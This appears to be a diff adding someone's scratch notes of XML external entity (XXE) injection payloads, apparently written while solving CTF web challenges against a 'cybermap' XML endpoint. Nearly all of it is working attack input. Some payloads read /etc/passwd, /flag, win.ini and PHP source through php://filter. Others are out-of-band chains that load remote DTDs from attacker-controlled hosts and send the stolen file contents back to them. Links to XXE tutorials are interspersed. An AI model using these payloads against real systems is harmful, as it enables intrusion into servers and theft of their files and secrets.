@@ -1,0 +1,336 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>                                                             
+<message>
+<id></id>
+<message>&xxe;</message>
+<title>xml</title>
+</message>
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!ENTITY % payl SYSTEM 'file:///flag.txt'>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>  
+<cybermap>
+	<name>&xxe;</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://172.17.0.1:2018/file.dtd">%remote;%int;%trick;]>
+<!ENTITY % payl SYSTEM 'file:///flag.txt'>
+<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://172.17.0.1:2018/?p=%pay;'>"> 
+
+
+<!DOCTYPE foo [ <!ENTITY % payl SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [ <!ENTITY % payl SYSTEM "file:///etc/passwd"> <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://172.17.0.1:2018/?p=%payl;'>">]>
+
+<!DOCTYPE foo [ <!ENTITY % payl SYSTEM "file:///etc/passwd"> ] [ <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://172.17.0.1:2018/?p=%payl;'>"]>
+
+
+
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+
+
+
+file.dtd:
+<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://172.17.0.1:2018/?p=%pay;'>">
+on website:
+<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://172.17.0.1:2018/file.dtd">%remote;%int;%trick;]>
+
+
+
+https://jbz.team/midnightsunctfquals2019/Rubenscube
+
+
+file.xml:
+<!ENTITY % pay SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd"> 
+<!ENTITY % test "<!ENTITY trick SYSTEM 'http://172.17.0.1:2018/p=%pay;'>">
+on website:
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://172.17.0.1:2018/file.xml">
+%remote;
+%test;
+%trick;
+]>
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://172.17.0.1:2018/test2.dtd">
+<cybermap>
+	<name>&file</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://172.17.0.1:2018/test2.dtd">
+<cybermap>
+	<name>random</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+<!DOCTYPE STRUCTURE [
+<!ELEMENT name (#PCDATA)>
+<!ENTITY VERSION "1.1">
+<!ENTITY file SYSTEM “file:///etc/passwd” >
+]>
+
+
+
+
+
+
+
+<?xml version="1.0" ?>
+<!DOCTYPE hack [
+<!ENTITY % alpha SYSTEM "http://172.17.0.1:2018/test2.dtd">
+%alpha;
+%bravo;
+]>
+<cybermap>
+	<name>MAP</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+<?xml version="1.0" ?>
+<!DOCTYPE hack [
+<!ENTITY % alpha SYSTEM "http://172.17.0.1:2018/test2.dtd">
+%alpha;
+]>
+<cybermap>
+	<name>MAP</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+<?xml version="1.0" encoding="utf-8" ?>
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % bravo "<!ENTITY % charlie SYSTEM 'http://172.17.0.1:2018/?%data;'>">
+
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+
+<?xml version="1.0" ?>
+<!DOCTYPE cybermap [
+<!ENTITY % alpha SYSTEM "http://10.0.254.20:2018/test.dtd">
+%alpha;
+%bravo;
+]>
+<cybermap>
+	<name>&charlie;</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+<?xml version="1.0" encoding="utf-8" ?>
+<!ENTITY % delta SYSTEM "file:///etc/passwd">
+<!ENTITY % bravo "<!ENTITY charlie SYSTEM 'http://10.0.254.20:2018/random'>">
+
+
+https://www.synack.com/blog/a-deep-dive-into-xxe-injection/
+https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
+https://r00thunt.com/2018/10/05/blind-xml-external-entities-out-of-band-channel-vulnerability-paypal-case-study/
+https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+test.dtd
+<!ENTITY % delta SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/make.php">
+<!ENTITY % bravo "<!ENTITY charlie SYSTEM 'http://10.0.254.20:2018/%delta;'>">
+
+
+<?xml version="1.0" ?>
+<!DOCTYPE cybermap [
+<!ENTITY % alpha SYSTEM "http://10.0.254.20:2018/test.dtd">
+%alpha;
+%bravo;
+%delta;
+]>
+<cybermap>
+	<name></name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+-----------------------------------------------------------------------------------------------------------------------------------
+<!ENTITY % delta SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/make.php">
+<!ENTITY % bravo "<!ENTITY &#37; charlie SYSTEM 'http://10.0.254.20:2018/'>">
+
+
+<?xml version="1.0" ?>
+<!DOCTYPE cybermap [
+<!ENTITY % alpha SYSTEM "http://10.0.254.20:2018/test.dtd">
+%alpha;
+%bravo;
+%charlie;
+%delta;
+]>
+<cybermap>
+	<name></name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+<?xml version="1.0" ?>
+<!DOCTYPE cybermap [
+<!ENTITY % delta SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+<!ENTITY % bravo "<!ENTITY &#37; charlie SYSTEM 'http://10.0.254.20:2018/?t=%delta;'>">
+%bravo;
+]>
+<cybermap>
+	<name></name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+step 1:
+payloadallthethingsi
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=make.php"> ]>
+<cybermap>
+	<name>&xxe;</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+-----------------------------------------------------------------------------------------------------------------------------------
+step 2:
+https://gist.github.com/staaldraad/01415b990939494879b4 - last comment
+
+
+
+test.dtdi
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com/problem/27747/make.php?name=test&country%5B%5D=US&country%5B%5D=CN">
+<!ENTITY % bravo "<!ENTITY &#37; charlie SYSTEM 'http://10.0.254.20:2018/'>">
+
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE cybermap [
+<!ENTITY % alpha SYSTEM "http://10.0.254.20:2018/test.dtd">
+%alpha;
+%xxe;
+]>
+<cybermap>
+	<name>testing</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE replace [
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com/problem/27747/make.php?name=test&country%5B%5D=US&country%5B%5D=CN"> 
+<!ENTITY callhome SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.254.20:2018/?%xxe;"> 
+]>
+<cybermap>
+	<name>&callhome;</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+
+test4.dtd
+<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'php://filter/convert.base64-encode/resource=http://10.0.254.20:2018/%file;'>">
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE replace [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com/problem/27747/make.php?name=test&country%5B%5D=US&country%5B%5D=CN"> 
+<!ENTITY % dtd SYSTEM "http://10.0.254.20:2018/test4.dtd">
+%dtd;
+%all;
+%req;
+]>
+<cybermap>
+	<name>test</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+https://resources.infosecinstitute.com/finding-and-exploiting-xxe-xml-external-entities-injection/#gref
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE replace [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=http://challenge.acictf.com/problem/27747/make.php?name=test&country%5B%5D=US&country%5B%5D=CN"> 
+<!ENTITY % dtd SYSTEM "http://10.0.254.20:2018/test4.dtd">
+%dtd;
+%all;
+%req;
+]>
+<cybermap>
+	<name>test</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
+
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------
+https://resources.infosecinstitute.com/finding-and-exploiting-xxe-xml-external-entities-injection/#gref
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE replace [
+<!ENTITY file SYSTEM "http://challenge.acictf.com/problem/27747/make.php?name=test&country%5B%5D=US&country%5B%5D=CN">
+]>
+<cybermap>
+	<name>&file;</name>
+	<country>CN</country>
+	<country>US</country>
+</cybermap>
